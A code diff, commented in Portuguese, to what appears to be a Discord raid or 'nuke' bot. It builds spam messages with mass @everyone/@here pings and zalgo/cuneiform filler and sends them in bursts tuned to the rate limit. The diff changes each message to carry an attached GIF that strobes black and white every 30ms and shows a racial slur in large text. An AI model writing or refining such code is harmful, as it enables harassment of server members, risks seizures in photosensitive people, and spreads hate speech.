@@ -136,7 +136,7 @@ def build_nuke_payload() -> str:
        1) linha SOCIETY em caps/bold (bem visivel)
        2) @everyone/@here em massa
        3) cuneiforme+zalgo pra encher
-       4) URL do GIF custom SEMPRE no final (preview visivel)"""
+       (GIF vai como anexo da mensagem via _gif_file — URL morta removida)"""
     # 1) texto visivel
     header = f"🔥 **{SOCIETY_LINE.upper()}** 🔥"
     # 2) pings
@@ -146,7 +146,7 @@ def build_nuke_payload() -> str:
     # 3) filler cuneiforme/zalgo (o que sobra de espaco)
     filler = []
     cur = 0
-    budget = MAX_MSG - len(header) - len(pings) - 270  # reserva URL
+    budget = MAX_MSG - len(header) - len(pings)
     while cur < budget:
         r = random.random()
         if r < 0.55:
@@ -162,16 +162,41 @@ def build_nuke_payload() -> str:
             seg = seg[: budget - cur]
         filler.append(seg)
         cur += len(seg)
-    body = f"{header}\n{pings}\n{''.join(filler)}\n{GIF_CUSTOM_URLS[0]}"
+    body = f"{header}\n{pings}\n{''.join(filler)}"
     return body[:MAX_MSG]
 
 
 # ============================ MÍDIA ============================
-def make_strobe_gif(w: int = 320, h: int = 320, frames: int = 12) -> bytes:
-    """GIF piscando preto/branco com texto invertendo cor (anexo de apoio)."""
+_FONT_CANDIDATES = [
+    "/data/data/com.termux/files/usr/share/fonts/TTF/DejaVuSans-Bold.ttf",
+    "/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf",
+    "/usr/share/fonts/TTF/DejaVuSans-Bold.ttf",
+    "/data/data/com.termux/files/usr/share/fonts/TTF/DejaVuSansCondensed-Bold.ttf",
+    "/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf",
+]
+
+
+def _load_font(size: int):
+    from PIL import ImageFont
+    for p in _FONT_CANDIDATES:
+        try:
+            return ImageFont.truetype(p, size)
+        except Exception:
+            continue
     try:
-        from PIL import Image, ImageDraw, ImageFont
+        return ImageFont.load_default()
     except Exception:
+        return None
+
+
+def make_strobe_gif(w: int = 640, h: int = 360, frames: int = 12) -> bytes:
+    """GIF strobe: fundo alterna preto↔branco a cada frame (30ms),
+    texto 'SET SOCIETY WAS HERE NIGGER' GIGANTE em 2 linhas com cor INVERTIDA
+    por frame (branco no preto / preto no branco). Anexo real, não URL."""
+    try:
+        from PIL import Image, ImageDraw
+    except Exception:
+        # fallback: PNG estático gerado à mão (sem texto, só xadrez) — nunca chega a isso no Actions
         rows = []
         for y in range(h):
             row = bytearray([0])
@@ -189,23 +214,27 @@ def make_strobe_gif(w: int = 320, h: int = 320, frames: int = 12) -> bytes:
         return (b"\x89PNG\r\n\x1a\n" + chunk(b"IHDR", ihdr) +
                 chunk(b"IDAT", idat) + chunk(b"IEND", b""))
     imgs = []
+    lines = ["SET SOCIETY", "WAS HERE NIGGER"]
+    fnt = _load_font(96)
     for i in range(frames):
-        img = Image.new("RGB", (w, h), (0, 0, 0) if i % 2 == 0 else (255, 255, 255))
+        bg = (0, 0, 0) if i % 2 == 0 else (255, 255, 255)
+        fg = (255, 255, 255) if i % 2 == 0 else (0, 0, 0)
+        img = Image.new("RGB", (w, h), bg)
         d = ImageDraw.Draw(img)
+        # faixas verticais pra dar movimento visual extra
         for bx in range(0, w, 64):
-            d.rectangle([bx, 0, bx + 32, h],
-                        fill=(255, 255, 255) if i % 2 == 0 else (0, 0, 0))
-        try:
-            fnt = ImageFont.truetype(
-                "/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 38)
-        except Exception:
-            fnt = ImageFont.load_default()
-        d.text((w // 2 - 150, h // 2 - 25), "SET SOCIETY",
-               fill=(0, 0, 0) if i % 2 == 0 else (255, 255, 255), font=fnt)
+            d.rectangle([bx, 0, bx + 32, h], fill=fg if i % 2 == 0 else bg)
+        if fnt:
+            for li, line in enumerate(lines):
+                bb = d.textbbox((0, 0), line, font=fnt)
+                tw, th = bb[2] - bb[0], bb[3] - bb[1]
+                x = (w - tw) // 2 - bb[0]
+                y = (h - th) // 2 + (li - 1) * (th + 8)
+                d.text((x, y), line, fill=fg, font=fnt)
         imgs.append(img)
     buf = io.BytesIO()
     imgs[0].save(buf, format="GIF", save_all=True, append_images=imgs[1:],
-                 duration=35, loop=0, optimize=False)
+                 duration=30, loop=0, optimize=False)
     return buf.getvalue()
 
 
@@ -283,15 +312,16 @@ async def _check_ok(ctx) -> bool:
 # ============================ ENVIO / VIEW ============================
 async def _burst_send(channel, n: int, base: str | None) -> int:
     """Envia n mensagens respeitando o rate limit real (bucket de msg por canal).
+    Cada mensagem leva o GIF custom ANEXADO (discord.File) — não depende de URL.
     Retorna quantas conseguiu mandar de verdade (429 espera retry_after e continua)."""
     ok = 0
     for _ in range(n):
         try:
             if base:
-                msg = f"{base}\n\n{SOCIETY_LINE}\n{GIF_CUSTOM_URLS[0]}"
+                msg = f"{base}\n\n{SOCIETY_LINE}"
             else:
                 msg = build_nuke_payload()
-            await channel.send(msg, allowed_mentions=MENTIONS)
+            await channel.send(msg, allowed_mentions=MENTIONS, file=_gif_file())
             ok += 1
         except discord.HTTPException as e:
             if e.status == 429:
